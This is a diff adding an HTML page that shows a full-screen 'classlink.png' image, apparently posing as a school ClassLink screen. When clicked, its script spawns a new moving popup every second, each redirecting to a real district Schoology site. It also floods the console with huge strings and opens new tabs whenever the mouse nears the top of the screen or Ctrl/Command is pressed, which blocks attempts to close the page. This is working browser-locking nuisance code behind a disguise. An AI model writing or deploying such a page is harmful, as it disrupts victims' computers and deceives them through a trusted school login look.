@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> </title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            overflow: hidden;
+            height: 100vh;
+            background: #000;
+            position: relative;
+            cursor: pointer;
+        }
+        
+        #start-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1000;
+        }
+        
+        /* Hidden initially */
+        #background-video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Start image that fills screen -->
+    <img id="start-image" src="classlink.png" alt="Click to start">
+    
+    <!-- Background video -->
+    <video id="background-video" loop muted>
+        <source src="video.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <script>
+        // Global variables
+        let popups = [];
+        let intervalId = null;
+        let popupCounter = 0;
+        let isStarted = false;
+        let animationId = null;
+        let lastMouseY = 0;
+        
+        // DOM elements
+        const startImage = document.getElementById('start-image');
+        const backgroundVideo = document.getElementById('background-video');
+        
+        // Start the experience when image is clicked
+        startImage.addEventListener('click', startExperience);
+        
+        // Mouse position tracking for top detection
+        document.addEventListener('mousemove', (e) => {
+            lastMouseY = e.clientY;
+            
+            // If mouse is within 30px from top and experience has started, open new tab
+            if (isStarted && lastMouseY <= 30) {
+                window.open('https://pausd.schoology.com', '_blank');
+            }
+        });
+        
+        // Keyboard detection for Ctrl or Command key
+        let ctrlPressed = false;
+        let cmdPressed = false;
+        
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey) ctrlPressed = true;
+            if (e.metaKey) cmdPressed = true; // Command key on Mac
+            
+            // If Ctrl or Command is pressed and experience has started, open new tab
+            if (isStarted && (ctrlPressed || cmdPressed)) {
+                window.open('https://pausd.schoology.com', '_blank');
+            }
+        });
+        
+        document.addEventListener('keyup', (e) => {
+            if (e.key === 'Control') ctrlPressed = false;
+            if (e.key === 'Meta') cmdPressed = false;
+        });
+        
+        function startExperience() {
+            if (isStarted) return;
+            
+            isStarted = true;
+            
+            // Hide start image
+            startImage.style.display = 'none';
+            
+            // Show and play background video
+            backgroundVideo.style.display = 'block';
+            backgroundVideo.play();
+            
+            // Start infinite console logging
+            startInfiniteLogging();
+            
+            // Start creating popups every second
+            intervalId = setInterval(() => {
+                createBrowserPopup();
+            }, 1000);
+            
+            // Start animation
+            startPopupAnimation();
+        }
+        
+        // Create a single browser popup window
+        function createBrowserPopup() {
+            popupCounter++;
+            
+            // Calculate random position
+            const screenWidth = window.screen.availWidth;
+            const screenHeight = window.screen.availHeight;
+            const popupWidth = 400;
+            const popupHeight = 300;
+            
+            const left = Math.floor(Math.random() * (screenWidth - popupWidth));
+            const top = Math.floor(Math.random() * (screenHeight - popupHeight));
+            
+            // Create popup window
+            let popupWindow;
+            try {
+                popupWindow = window.open(
+                    '', 
+                    `popup-${popupCounter}`, 
+                    `width=${popupWidth},height=${popupHeight},left=${left},top=${top},resizable=no,scrollbars=no,toolbar=no,menubar=no,location=no,status=no`
+                );
+                
+                if (!popupWindow || popupWindow.closed) {
+                    return null;
+                }
+                
+                // Write simple HTML with meta refresh to popup
+                popupWindow.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <meta http-equiv="refresh" content="0, url=https://pausd.schoology.com">
+                        <style>
+                            body {
+                                margin: 0;
+                                padding: 0;
+                                background: black;
+                            }
+                        </style>
+                    </head>
+                    <body>
+                        <p>Redirecting to Schoology...</p>
+                    </body>
+                    </html>
+                `);
+                popupWindow.document.close();
+                
+                // Random velocity for movement
+                const velocity = {
+                    x: (Math.random() - 0.5) * 20,
+                    y: (Math.random() - 0.5) * 20
+                };
+                
+                const popupData = {
+                    window: popupWindow,
+                    id: `popup-${popupCounter}`,
+                    velocity: velocity,
+                    width: popupWidth,
+                    height: popupHeight,
+                    left: left,
+                    top: top
+                };
+                
+                popups.push(popupData);
+                
+                return popupData;
+                
+            } catch (error) {
+                return null;
+            }
+        }
+        
+        // Start infinite console logging
+        function startInfiniteLogging() {
+            // This will run in the background
+            const logString = "𐀒".repeat(10000); // Create a long string of the character
+            
+            // Use setInterval to keep logging without blocking
+            setInterval(() => {
+                console.log(logString);
+            }, 100);
+        }
+        
+        // Animate all popup windows (move them around)
+        function animatePopups() {
+            if (popups.length === 0) {
+                animationId = requestAnimationFrame(animatePopups);
+                return;
+            }
+            
+            popups.forEach((popup, index) => {
+                if (!popup.window || popup.window.closed) {
+                    // Remove closed popups
+                    popups.splice(index, 1);
+                    return;
+                }
+                
+                // Update position
+                popup.left += popup.velocity.x;
+                popup.top += popup.velocity.y;
+                
+                // Boundary checks (bounce)
+                const screenWidth = window.screen.availWidth;
+                const screenHeight = window.screen.availHeight;
+                
+                // Check horizontal boundaries
+                if (popup.left <= 0) {
+                    popup.left = 0;
+                    popup.velocity.x = Math.abs(popup.velocity.x);
+                } else if (popup.left + popup.width >= screenWidth) {
+                    popup.left = screenWidth - popup.width;
+                    popup.velocity.x = -Math.abs(popup.velocity.x);
+                }
+                
+                // Check vertical boundaries
+                if (popup.top <= 0) {
+                    popup.top = 0;
+                    popup.velocity.y = Math.abs(popup.velocity.y);
+                } else if (popup.top + popup.height >= screenHeight) {
+                    popup.top = screenHeight - popup.height;
+                    popup.velocity.y = -Math.abs(popup.velocity.y);
+                }
+                
+                // Try to move the window
+                try {
+                    if (!popup.window.closed) {
+                        popup.window.moveTo(Math.floor(popup.left), Math.floor(popup.top));
+                    }
+                } catch (error) {
+                    // Some browsers may block window moving
+                }
+            });
+            
+            animationId = requestAnimationFrame(animatePopups);
+        }
+        
+        // Start popup animation
+        function startPopupAnimation() {
+            if (animationId) {
+                cancelAnimationFrame(animationId);
+            }
+            animationId = requestAnimationFrame(animatePopups);
+        }
+    </script>
+</body>
+</html>
